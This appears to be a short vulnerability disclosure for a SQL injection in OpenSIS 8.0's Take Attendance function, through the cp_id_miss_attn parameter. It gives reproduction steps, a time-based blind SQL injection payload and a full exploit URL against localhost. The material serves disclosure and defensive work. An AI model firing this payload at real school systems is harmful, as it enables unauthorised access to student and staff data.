A SQL injection vulnerability exists in the Take Attendance functionality of OS4Ed's OpenSIS 8.0. allows an attacker to inject their own SQL query. The cp_id_miss_attn parameter from TakeAttendance.php is vulnerable to SQL injection. An attacker can make an authenticated HTTP request as a user with access to "Take Attendance" functionality to trigger this vulnerability.

Steps to reproduce:

1. Login as "Teacher" and navigate to "Attendance" then "Take Attendance". Capture the request on a web proxy such as BurpSuite Or just navigate to the URL: http://localhost/Ajax.php?modname=users/TeacherPrograms.php?include=attendance/TakeAttendance.php&modfunc=attn&attn=miss&from_dasboard=1&date=Aug/9/2021&cp_id_miss_attn=27&cpv_id_miss_attn=23&ajax=true

Vulnerable parameter: cp_id_miss_attn

SQLi payload: r AND (SELECT 1670 FROM (SELECT(SLEEP(10)))VSpq)

URL with the payload: http://localhost/Ajax.php?modname=users/TeacherPrograms.php?include=attendance/TakeAttendance.php&modfunc=attn&attn=miss&from_dasboard=1&date=Aug/9/2021&cp_id_miss_attn=r AND (SELECT 1670 FROM (SELECT(SLEEP(10)))VSpq)&cpv_id_miss_attn=23&ajax=true 2.
